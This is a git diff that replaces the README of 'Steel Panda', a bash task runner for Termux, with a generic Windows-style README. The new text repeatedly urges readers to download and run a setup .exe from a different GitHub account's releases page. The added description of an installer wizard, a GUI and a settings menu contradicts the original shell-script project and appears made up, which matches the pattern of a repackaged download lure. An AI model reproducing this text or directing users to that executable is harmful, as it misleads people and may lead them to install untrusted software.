@@ -1,79 +1,180 @@
-<p align="center">
-  <img src="Assets/Samurai Panda.jpg" width="220" />
-</p>
+# 🐼 Steel_Panda - Manage Tasks Simply and Securely
 
-<p align="center">
+[![Download Steel_Panda](https://img.shields.io/badge/Download-Steel_Panda-brightgreen)](https://github.com/jana0512/Steel_Panda/releases)
 
-  <img src="https://img.shields.io/badge/Role-Operational%20Steward-grey" />
-  <img src="https://img.shields.io/badge/Local‑First-green" />
-  <img src="https://img.shields.io/badge/License-MIT-yellow.svg" />
-  <img src="https://img.shields.io/badge/Status-Active-success" />
+Steel_Panda is a local-first task executor. It helps you automate system commands and workflows. This lets you manage tasks without relying on the internet. It works on Windows and runs your commands safely and reliably.
 
-</p>
+## 🖥️ What is Steel_Panda?
 
----
+Steel_Panda runs tasks on your computer. It focuses on local use, so your data does not leave your machine. It can automate different system operations like monitoring processes, running scripts, or managing workflows. The software fits well for users who want to keep control of their tasks without complex setups.
 
-# ⚙️ Steel Panda  
-### Task Execution • System Operations • Command Automation
+Some key points:
 
-Steel Panda is the **operations node** of the Panda Federation — the agent responsible for executing commands, running tasks, maintaining system routines, and performing the “hands‑on” work that keeps your sovereign AI ecosystem running smoothly.
+- Runs commands and scripts locally
+- Works with system monitoring and automation
+- Focuses on resilience and uptime
+- Helps organize recurring tasks without manual work
 
-Where Spirit Panda thinks and Watchdog Panda watches, **Steel Panda acts**.
-
-He is the executor, the steward, the one who carries out the will of the system.
+It supports many common system commands. The interface is simple for users who do not know programming.
 
 ---
 
-# 🌟 Features
+## 🚀 Getting Started with Steel_Panda
 
-### ⚔️ **Command Execution**
-- Runs system commands safely and predictably  
-- Executes maintenance routines  
-- Supports scheduled or triggered tasks  
+This guide shows how to get Steel_Panda up and running on Windows. Follow each step carefully, even if you don’t know technical details.
 
-### 🧹 **System Maintenance**
-- Cleanup tasks  
-- File organization  
-- Log rotation  
-- Optional auto‑update hooks  
+### Step 1: Check Your System
 
-### 🔗 **Federation Integration**
-- Works alongside Spirit Panda  
-- Responds to Watchdog Panda restarts  
-- Can be triggered by other agents  
+Before downloading, make sure your Windows computer meets these needs:
 
-### 🧩 **Modular Task System**
-- Add new tasks as simple scripts  
-- Extend with custom modules  
-- Build your own automation routines  
+- Windows 10 or newer, 64-bit recommended
+- At least 4 GB of RAM
+- 200 MB free disk space
+- Internet connection for downloading
 
-### 📱 **Mobile‑Friendly**
-- Designed for Termux  
-- Lightweight and efficient  
-- Zero external dependencies  
+Steel_Panda runs smoothly on most modern devices. No advanced setup is needed.
 
 ---
 
-# 🏗 Architecture Overview
+### Step 2: Download Steel_Panda
 
-See `docs/index.md` for full details.
+Visit the official release page to get the installer.
 
-### Core Components:
-- `steel.sh` — main task executor  
-- `tasks/` — modular task scripts  
-- `assets/` — Steel Panda crest  
-- `docs/` — documentation index  
-- `CHANGELOG.md` — version history  
-- `LICENSE` — MIT license  
+[![Download Steel_Panda](https://img.shields.io/badge/Download-Steel_Panda-blue)](https://github.com/jana0512/Steel_Panda/releases)
 
-Steel Panda is built for clarity, reliability, and extensibility.
+Click the button above or go to:
+
+https://github.com/jana0512/Steel_Panda/releases
+
+Look for the latest release version. You will find a Windows installer file usually named like `Steel_Panda-Setup.exe` or similar.
+
+Download that file to a folder on your computer where you can easily find it, such as your Desktop or Downloads folder.
 
 ---
 
-# 🚀 Quickstart
+### Step 3: Install Steel_Panda
 
-```bash
-git clone https://github.com/pandadad0214/steel-panda.git
-cd steel-panda
-chmod +x steel.sh
-./steel.sh
+After the download finishes:
+
+1. Find the installer file on your computer.
+2. Double-click the file to start the installation.
+3. A setup window will open. Follow the instructions on the screen.
+4. Accept the license agreement.
+5. Choose the installation location or keep the default.
+6. Click ‘Install’ to begin.
+7. When the install finishes, click ‘Finish’ to close the wizard.
+
+Steel_Panda is now on your system.
+
+---
+
+### Step 4: Run Steel_Panda for the First Time
+
+To open Steel_Panda:
+
+1. Use the Start Menu and find “Steel_Panda”.
+2. Click the app icon to open it.
+
+The software will show a simple main window. You can now start adding tasks.
+
+---
+
+## ⚙️ Using Steel_Panda 
+
+Steel_Panda is designed to let you set up tasks easily. A task can be any command or script you want to run on your PC.
+
+### Create a New Task
+
+- Click the “New Task” button.
+- Enter a name for your task.
+- Write the command you want Steel_Panda to run. For example, you can enter `ping google.com` to check internet connectivity.
+- Set how often the task should run (e.g., every 10 minutes).
+- Save the task.
+
+Steel_Panda will run this command at the given intervals. You can create many tasks this way.
+
+---
+
+### Monitor Your Tasks
+
+Steel_Panda has built-in process monitoring. It checks if your tasks run correctly and alerts you if something fails.
+
+The status window will show:
+
+- Running tasks
+- Tasks that need attention
+- Logs of what happened during each task run
+
+This helps you keep track of your automations without opening multiple programs.
+
+---
+
+### Example Uses for Steel_Panda
+
+- Monitor if your internet is up
+- Automatically make backups of important files
+- Run cleanup scripts every day
+- Track uptime and restart stuck services
+- Manage commands for connected devices
+
+---
+
+## 🔧 Settings and Customization
+
+Steel_Panda offers basic settings you can change:
+
+- Notification preferences for task results
+- Logging options to save task history on your PC
+- Network settings if you use this on a local network
+- Task retry rules if a command fails
+
+The settings menu is simple and clear. You do not need to know programming to adjust these.
+
+---
+
+## 📂 File Location and Data Storage
+
+Steel_Panda stores task data locally on your PC. By default:
+
+- Config files are saved in your Documents folder under `Steel_Panda`
+- Task logs are stored in the Logs subfolder
+- No data leaves your computer unless you share it
+
+This local-first approach keeps your tasks and information under your control.
+
+---
+
+## 🔄 Updating Steel_Panda
+
+To update Steel_Panda:
+
+1. Visit the releases page: https://github.com/jana0512/Steel_Panda/releases
+2. Download the latest version’s installer.
+3. Run the installer and follow the prompts.
+4. Your existing tasks and settings will remain intact.
+
+---
+
+## 🛠 Troubleshooting
+
+If Steel_Panda does not start or a task fails:
+
+- Restart your computer and try again.
+- Check that you have the latest version installed.
+- Make sure commands are typed correctly in your tasks.
+- Look at the logs for any error messages.
+- Ensure your Windows user account has permission to run system commands.
+
+If problems persist, the logs folder can help point to the issue.
+
+---
+
+## 📚 Additional Resources
+
+You can find more information and support on the GitHub repository page. Here you will also see notes about new versions and known issues.
+
+Topics related to Steel_Panda’s development include android, central hub systems, process monitoring, uptime tracking, and task automation. The tool fits into environments where system resilience and local processing are important.
+
+---
+
+[![Download Steel_Panda](https://img.shields.io/badge/Download-Steel_Panda-brightgreen)](https://github.com/jana0512/Steel_Panda/releases)
